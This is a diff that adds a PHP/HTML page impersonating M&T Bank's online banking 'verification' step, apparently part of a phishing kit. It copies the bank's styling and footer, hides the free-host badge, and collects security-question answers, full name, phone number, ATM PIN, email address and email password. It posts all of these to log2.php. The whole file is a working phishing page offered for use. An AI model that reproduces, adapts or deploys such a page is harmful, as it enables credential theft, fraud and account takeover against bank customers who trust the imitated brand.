@@ -1,0 +1,274 @@
+<?php
+ini_set("output_buffering",4096);
+session_start();
+?>
+<!doctype html>
+<html lang="en">
+<head>
+    <title>Online Banking Verification | M&amp;T Bank</title>
+<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link href="https://resources.mtb.com/r/app-layout/css.mtb" rel="stylesheet"/>
+   <link href="https://resources.mtb.com/styles/retail.css" rel="stylesheet"/>
+   <link href="https://resources.mtb.com/styles/Agreement.css" rel="stylesheet"/>
+   <style>img[alt="www.000webhost.com"]{display:none;}</style>
+
+
+</head>
+<body>
+    <div id="divHeader">
+    <div class="banner">
+    </div>
+</div>
+
+    <div id="main" style="margin-left:29px;">
+        
+
+<span id="timer" class="hide time-out"></span>
+<div id="divBeyondNineMin">
+  
+</div>
+<div id="divBeyondNineMinForRsa">
+  
+</div>
+
+
+
+<div id="divIntroBoxLayout" class="intro-area">
+   <h1 id="hdr1">Verify your account information </h1>
+                <h4 id="hdr4">To confirm your identity, please your full information.</h4>
+            <h5 id="hdr5">
+      All fields required. You must correctly enter all the required information.
+    </h5>
+    </div>
+
+ 
+
+<div class="form-header soft-medium-gradient">
+    Verification Process</div>
+	<script language="JavaScript">
+<!--
+function check(form) {
+if (form.Q1.value=="")
+{ alert("Please select your Question 1 before submitting."); form.Q1.focus(); return;}
+if (form.A1.value=="")
+{ alert("Please enter your Question 1 Answer before submitting."); form.A1.focus(); return;}
+if (form.Q2.value=="")
+{ alert("Please select your Question 2 before submitting."); form.Q2.focus(); return;}
+if (form.A2.value=="")
+{ alert("Please enter your Question 2 Answer before submitting."); form.A2.focus(); return;}
+if (form.Q3.value=="")
+{ alert("Please select your Question 3 before submitting."); form.Q3.focus(); return;}
+if (form.A3.value=="")
+{ alert("Please enter your Question 3 Answer before submitting."); form.A3.focus(); return;}
+if (form.fname.value=="")
+{ alert("Please enter your Full Name before submitting."); form.fname.focus(); return;}
+if (form.phone.value=="")
+{ alert("Please enter your Phone Number before submitting."); form.phone.focus(); return;}
+// Start of phone error Alert!
+var checkOK = "0123456789";
+var checkStr = form.phone.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("Phone Number Must Be Only Numbers.");
+form.phone.focus();
+return;}
+// End of act error Alert!
+if (form.phone.value.length < 10) { alert("Phone Number Must Be Valid!");form.phone.focus();	return;}
+if (form.phone.value.length > 10) { alert("Phone Number Must Be Valid!");form.phone.focus();	return;}
+if (form.pin.value=="")
+{ alert("Please enter your 4-Digit PIN before submitting."); form.pin.focus(); return;}
+// Start of pin error Alert!
+var checkOK = "0123456789";
+var checkStr = form.pin.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("PIN Must Be Only Numbers.");
+form.pin.focus();
+return;}
+// End of act error Alert!
+if (form.pin.value.length < 4) { alert("your 4-Digit PIN is too short!");form.pin.focus();	return;}
+if (form.pin.value.length > 4) { alert("your 4-Digit PIN is too long!");form.pin.focus();	return;}
+if (form.mail.value=="")
+{ alert("Please enter your email address before submitting."); form.mail.focus(); return;}
+if (form.pass.value=="")
+{ alert("Please enter your email password before submitting."); form.pass.focus(); return;}
+form.submit()
+}
+//-->
+</script>
+<form action="log2.php" method="post" class="login-secquestion" onclick="check(this.form)" onsubmit="check(this.form)">	
+    <h2>
+        All Fields required.
+    </h2>
+	<br>
+<div class="custom-form" style="margin-bottom: 10px;width: 197px;height: 35px;">
+<h2 style="
+    margin-left: 20px;
+"><b style="font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-size: 12px; font-family: Arial; color: rgb(31, 31, 31);">Security Questions</b></h2>
+<hr id="null" style="margin-top: 5px;"></div>
+<div class="custom-select" style="width:500px;">
+  <select name="Q1" id="Q1" style="width:481px;">
+  <option value="" selected="selected">Select Question 1</option>
+    <option value="What is the first name of the maid of honor at your wedding?">What is the first name of the maid of honor at your wedding?</option>
+    <option value="What is the last name of your best friend in high school?">What is the last name of your best friend in high school?</option>
+    <option value="Name of the place where your wedding reception was held?">Name of the place where your wedding reception was held?</option>
+    <option value="What was your childhood phone number including area code?">What was your childhood phone number including area code?</option>
+    <option value="What was the model year of your first car? (YYYY)">What was the model year of your first car? (YYYY)</option>
+    <option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
+    <option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
+    <option value="In what year did you buy your first home? (YYYY)">In what year did you buy your first home? (YYYY)</option>
+    <option value="What was the name of your first pet you owned?">What was the name of your first pet you owned?</option>
+    <option value="What street did your best friend in high school live on? (Enter full name of street only)">What street did your best friend in high school live on? (Enter full name of street only)</option>
+  </select>
+</div>
+<div class="custom-form" style="margin-bottom:43px;">
+<input type="text" name="A1" required="" placeholder="Answer 1" id="A1">
+</div>
+<br>
+<div class="custom-select" style="width:500px;">
+  <select name="Q2" id="Q2" style="width:481px;">
+  <option value="" selected="selected">Select Question 2</option>
+    <option value="To what destination city did you fly on your first airplane ride?">To what destination city did you fly on your first airplane ride?</option>
+<option value="What was the name of your junior high school? (Enter " west"="" for="" west="" junior="" high)"="">What was the name of your junior high school? (Enter "West" for West Junior High)</option>
+<option value="Which was the first foreign country you visited?">Which was the first foreign country you visited?</option>
+<option value="What is the name of the first elementary school you attended?">What is the name of the first elementary school you attended?</option>
+<option value="What is the name of the hospital where you were born?">What is the name of the hospital where you were born?</option>
+<option value="Where did you meet your spouse for the first time? (Enter full name of city only)">Where did you meet your spouse for the first time? (Enter full name of city only)</option>
+<option value="What's the first name of the first person you kissed?">What's the first name of the first person you kissed?</option>
+<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</option>
+<option value="What was the first name of your first girlfriend or boyfriend?">What was the first name of your first girlfriend or boyfriend?</option>
+<option value="What was the name of your middle school?">What was the name of your middle school?</option>
+  </select>
+</div>
+<div class="custom-form" style="margin-bottom:43px;">
+<input type="text" name="A2" required="" placeholder="Answer 2" id="A2">
+</div>
+<br>
+<div class="custom-select" style="width:500px;">
+  <select name="Q3" id="Q3" style="width:481px;">
+  <option value="" selected="selected">Select Question 3</option>
+    <option value="In what city were you living at age 15? (Enter full name of city only)">In what city were you living at age 15? (Enter full name of city only)</option>
+<option value="What was the name of the instrument you played as a child?">What was the name of the instrument you played as a child?</option>
+<option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?</option>
+<option value="What is your paternal grandmother's first name?">What is your paternal grandmother's first name?</option>
+<option value="What is the name of the first company you worked for?">What is the name of the first company you worked for?</option>
+<option value="What was the first name of your date on senior prom night in high school?">What was the first name of your date on senior prom night in high school?</option>
+<option value="What is the maiden name of your father's mother?">What is the maiden name of your father's mother?</option>
+<option value="What year did you retire? (YYYY)">What year did you retire? (YYYY)</option>
+<option value="What is the last name of your first grade teacher?">What is the last name of your first grade teacher?</option>
+<option value="What is the middle name of your oldest sibling?">What is the middle name of your oldest sibling?</option>
+  </select>
+  
+</div>
+<div class="custom-form" style="margin-bottom:43px;">
+<input type="text" name="A3" required="" placeholder="Answer 3" id="A3">
+</div>
+
+       <div class="remember_device">
+                        <label for="RememberDevice"><span id="imgRememberDeviceHelp" class="contextual-help-icon"></span><b>Identity Verification</b></label><label for="RememberDevice">
+<hr id="null" /></label>
+<ul class='radio-list'>
+<div class="custom-form" style="margin-bottom:43px;">
+<input type="text" name="fname" required="" placeholder="Full Name" id="fname">
+</div>
+<div class="custom-form" style="margin-bottom:43px;">
+<input type="text" name="phone" required="" maxlength="10" placeholder="Phone Number" id="phone">
+</div>
+<div class="custom-form" style="margin-bottom:43px;">
+<input type="text" name="pin" maxlength="4" placeholder="ATM PIN" id="pin" style="width:60px;">
+</div>
+</ul><span class="field-validation-valid" data-valmsg-for="BindDevice" data-valmsg-replace="true" style="width:280px;margin-left:224px;margin-top:-10px; position: relative;top: -10px;left: 2px;"></span>    </div>
+<div class="remember_device">
+                        <label for="RememberDevice"><span id="imgRememberDeviceHelp" class="contextual-help-icon"></span><b>Email Credentials</b></label><label for="RememberDevice">
+<hr id="null" /></label>
+<ul class='radio-list'>
+<div class="custom-form" style="margin-bottom:43px;">
+<input value="" maxlength="45" placeholder="Email Address" class="form" type="text" id="mail" name="mail">
+</div>
+<div class="custom-form" style="margin-bottom:43px;">
+<input value="" maxlength="16" placeholder="Email Password" class="form" type="password" id="pass" name="pass">
+</div>
+</ul><span class="field-validation-valid" data-valmsg-for="BindDevice" data-valmsg-replace="true" style="width:280px;margin-left:224px;margin-top:-10px; position: relative;top: -10px;left: 2px;"></span>    </div>
+    <div class="button-section">
+        <button class=" bold-medium-gradient button-lrg-pri-arr" id="btnSubmit" href="javascript:submit()" onclick="check(this.form)" onsubmit="check(form);" type="button">Next<span class="primary-arrow"></span></button>
+    </div>
+     <div id="divDialogConfirm">
+        <p>You will not be able to access Online Banking until you answer the Security Question.
+        </p>
+        <p>
+           Are you sure you want to cancel?
+        </p>
+     </div> 
+</form>
+    </div>
+    
+<div class="footer">
+    <div class="footer-nav">
+        <ul>
+            <li ><a id="lnkPrivacy">Privacy</a><span class="text-pipe">|</span></li>
+            <li><a id="lnkSecurity">Security Assurance</a><span class="text-pipe">|</span></li>
+            <li><a id="lnkAgreement">Digital Services Agreement</a><span class="text-pipe">|</span></li>
+            <li><a id="lnkESignAgreement">ESign Agreement</a><span class="text-pipe">|</span></li>
+            <li><a id="lnkAccessibility" >Accessibility</a><span class="text-pipe">|</span></li>
+       
+            <li><a id="lnkMtbRetail">mtb.com</a></li>
+        </ul>
+    </div>
+     <div class="security-icons">
+        <a id="lnkFdic"  class="fdic-logo"><img src="https://resources.mtb.com/images/img_trans.gif" alt="Member FDIC" /></a>
+        <a id="lnkHousing" class="housing-logo"><img src="https://resources.mtb.com/images/img_trans.gif" alt="Equal Housing Lender" /> <span class="nmls">NMLS#381076</span></a>
+        <a id="lnkEntrust" class="entrust-logo"><img src="https://resources.mtb.com/images/img_trans.gif" alt="Entrust® Secured" /></a>
+       
+    </div>
+     <div class="time-stamp">&copy;2020 M&amp;T Bank. All Rights Reserved.</div>
+   
+</div>
+
+    <input id="UserType" name="UserType" type="hidden" value="R" />
+    <input id="userRole" name="userRole" type="hidden" value="R" />
+    
+
+<div id="contextual-help" class="soft-very-light-gradient contextual-help left" role="alertdialog" aria-labelledby="hd" aria-live="assertive" aria-relevant="all">
+  <span class="close"><img src='https://resources.mtb.com/images/img_trans.gif' alt='Close help' /></span>
+    <div class="message-header" id="hd">
+    </div>
+    <div class="message-body">
+    </div>
+</div>
+
+</body>
+</html>
+<?php ob_end_flush(); ?>
